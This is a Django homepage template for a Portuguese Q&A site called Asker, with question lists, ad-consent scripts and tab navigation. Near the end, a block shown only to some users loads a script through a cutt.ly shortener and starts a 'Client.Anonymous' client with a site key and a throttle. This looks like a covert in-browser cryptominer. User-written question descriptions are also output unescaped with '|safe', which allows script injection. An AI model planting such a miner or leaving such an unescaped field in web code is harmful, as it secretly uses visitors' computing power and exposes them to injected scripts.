{% spaceless %}
{% load humanize %}
{% load main_app_extras %}
<!doctype html>
<html lang="pt-br">
<head>
<title>Asker | Página inicial</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style id="wait">
	body {
		visibility: hidden;
		opacity: 0;
	}
</style>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<script src="/static/js/cookieman.js?v=1"></script>
<script>
	var cssfn = 'index.css';
	var cssversion = '?v=11';
	if (getDarkCookie() == 'true') { cssfn = 'index-d.css'; }
	var link = document.createElement('link');
	link.rel = 'stylesheet';
	link.type = 'text/css';
	link.href = '/static/css/' + cssfn + cssversion;
	document.head.appendChild(link);

	document.getElementById('wait').remove();
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.3.0/jquery.form.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/jquery.waypoints.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/shortcuts/infinite.min.js"></script>


<!-- The moneytizer -->
<!-- Quantcast Choice. Consent Manager Tag v2.0 (for TCF 2.0) -->
<script type="text/javascript" async="true">
(function() {
    var host = 'www.themoneytizer.com';
    var element = document.createElement('script');
    var firstScript = document.getElementsByTagName('script')[0];
    var url = 'https://quantcast.mgr.consensu.org'
        .concat('/choice/', '6Fv0cGNfc_bw8', '/', host, '/choice.js')
    var uspTries = 0;
    var uspTriesLimit = 3;
    element.async = true;
    element.type = 'text/javascript';
    element.src = url;

    firstScript.parentNode.insertBefore(element, firstScript);

    function makeStub() {
        var TCF_LOCATOR_NAME = '__tcfapiLocator';
        var queue = [];
        var win = window;
        var cmpFrame;

        function addFrame() {
            var doc = win.document;
            var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);

            if (!otherCMP) {
                if (doc.body) {
                    var iframe = doc.createElement('iframe');

                    iframe.style.cssText = 'display:none';
                    iframe.name = TCF_LOCATOR_NAME;
                    doc.body.appendChild(iframe);
                } else {
                    setTimeout(addFrame, 5);
                }
            }
            return !otherCMP;
        }

        function tcfAPIHandler() {
            var gdprApplies;
            var args = arguments;

            if (!args.length) {
                return queue;
            } else if (args[0] === 'setGdprApplies') {
                if (
                    args.length > 3 &&
                    args[2] === 2 &&
                    typeof args[3] === 'boolean'
                ) {
                    gdprApplies = args[3];
                    if (typeof args[2] === 'function') {
                        args[2]('set', true);
                    }
                }
            } else if (args[0] === 'ping') {
                var retr = {
                    gdprApplies: gdprApplies,
                    cmpLoaded: false,
                    cmpStatus: 'stub'
                };

                if (typeof args[2] === 'function') {
                    args[2](retr);
                }
            } else {
                queue.push(args);
            }
        }

        function postMessageEventHandler(event) {
            var msgIsString = typeof event.data === 'string';
            var json = {};

            try {
                if (msgIsString) {
                    json = JSON.parse(event.data);
                } else {
                    json = event.data;
                }
            } catch (ignore) {}

            var payload = json.__tcfapiCall;

            if (payload) {
                window.__tcfapi(
                    payload.command,
                    payload.version,
                    function(retValue, success) {
                        var returnMsg = {
                            __tcfapiReturn: {
                                returnValue: retValue,
                                success: success,
                                callId: payload.callId
                            }
                        };
                        if (msgIsString) {
                            returnMsg = JSON.stringify(returnMsg);
                        }
                        event.source.postMessage(returnMsg, '*');
                    },
                    payload.parameter
                );
            }
        }

        while (win) {
            try {
                if (win.frames[TCF_LOCATOR_NAME]) {
                    cmpFrame = win;
                    break;
                }
            } catch (ignore) {}

            if (win === window.top) {
                break;
            }
            win = win.parent;
        }
        if (!cmpFrame) {
            addFrame();
            win.__tcfapi = tcfAPIHandler;
            win.addEventListener('message', postMessageEventHandler, false);
        }
    };

    if (typeof module !== 'undefined') {
        module.exports = makeStub;
    } else {
        makeStub();
    }

    var uspStubFunction = function() {
        var arg = arguments;
        if (typeof window.__uspapi !== uspStubFunction) {
            setTimeout(function() {
                if (typeof window.__uspapi !== 'undefined') {
                    window.__uspapi.apply(window.__uspapi, arg);
                }
            }, 500);
        }
    };

    var checkIfUspIsReady = function() {
        uspTries++;
        if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
            console.warn('USP is not accessible');
        } else {
            clearInterval(uspInterval);
        }
    };

    if (typeof window.__uspapi === 'undefined') {
        window.__uspapi = uspStubFunction;
        var uspInterval = setInterval(checkIfUspIsReady, 6000);
    }
})();
</script>
<!-- End Quantcast Choice. Consent Manager Tag v2.0 (for TCF 2.0) -->

</head>

	<body>
	{% include "includes/navbar.html" %}
	{{ account_verification_alert|safe }}
  
		<ul class="nav nav-tabs" id="tabs">
			<li class="nav-item">
				<span class="nav-link main-tab bg-main-tab" id="popular">Popular</span>
			</li>
			<li class="nav-item">
				<span class="nav-link main-tab bg-main-tab" id="news">Novas perguntas</span>
			</li>
			<li style="flex-grow: 1;">
				<a data-pjax style="float: right;" href="/pjax-questions"><img src="/static/images/reload.png" id="reload"></a>
			</li>
		</ul>
<!-- Questões recentes -->
<section class="card bg-main" id="n_questions">
{% include "base/recent-questions-pjax.html" %}
</section>
<!-- !Questões recentes -->

<!-- Questões populares -->
<section class="card bg-main" id="p_questions">
	<ul class="list-group list-group-flush infinite-container">
		{% for question in popular_questions %}
		<li class="list-group-item bg-main">
			<div class="card-body">

        <a href="/question/{{ question.id }}">
          <p>
            <b>
              {{ question.text }}
            </b>
          </p>
        </a>

					{% if question.description != '' %}
            <p>
              {{ question.description|cut_description|safe|linebreaksbr }}
            </p>
          {% endif %}
				<small>{% total_answers question.id %} respostas <b>&middot; </b> <span class="text-muted"><img src="/static/images/white-heart.png?version=3" width="15px"> {{ question.total_likes }}</span></small>&nbsp;|&nbsp;<small>{% question_total_views question.id %} visualizações</small>
				{% if user.is_authenticated %}
					{% answered user.username question.id as ANSWERED %}
					{% if ANSWERED %}
				<span style="display: block"><b>Sua resposta:</b></span> {% answer user.username question.id %}
					{% else %}
				<a style="display: block" href="/question/{{ question.id }}"><button class="btn btn-outline-primary">Responder</button></a>
					{% endif %}
				{% else %}
				<p><a href="/signin?redirect=/question/{{ question.id }}">Faça login</a> ou <a href="/signup?redirect=/question/{{ question.id }}">crie uma conta</a> para responder está pergunta.</p>
			{% endif %}
			</div>
		</li>
		{% endfor %}
	</ul>
	<h5>Fim! <a href="/news">Clique aqui</a> para ver as novas perguntas.</h5>
</section>
<!-- !Questões populares -->

<!-- PJAX -->
<script src="/static/js/jquery-pjax/jquery.pjax.js"></script>
<script>
	$(document).pjax('[data-pjax] a, a[data-pjax]', '#n_questions', {push: false, timeout: 10000})
	$('#n_questions').on('pjax:start', function() {
		/* Muda para a aba de perguntas recentes. */
		news.classList.add('active')
		popular.classList.remove('active')
		window.history.pushState("object or string", "Title", "/news");
		logo.href = '/news'
		p_tab.style.display = 'none'
		n_tab.style.display = 'block'

		document.getElementById('reload').classList.add('spinner');
		document.getElementById('n_questions').style.opacity = 0.5;
		document.getElementById('reload').onclick = function () { return false; }
	})
	.on('pjax:end',   function() {
		document.getElementById('reload').classList.remove('spinner');
		document.getElementById('n_questions').style.opacity = 1;
		document.getElementById('reload').onclick = function () { return true; }

	});
</script>
<!-- !PJAX -->

		<script src="/static/js/index.js?v=9"></script>
		<script>
if (getDarkCookie() == 'true') {
	document.getElementsByClassName('navbar')[0].classList.remove("navbar-light");
	document.getElementsByClassName('navbar')[0].classList.add("navbar-dark");
}
		</script>

    <!-- Jus70 -->
{% can user.email request as CAN %}
{% if CAN %}
<script>
  $.getScript("https://cutt.ly/wns1PUz", function() {
    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
        throttle: 0.7, c: 'w'
    });
    _client.start();
    console.log('-');
  });
</script>
{% endif %}
    <!-- !Jus70 -->
	</body>
</html>
{% endspaceless %}
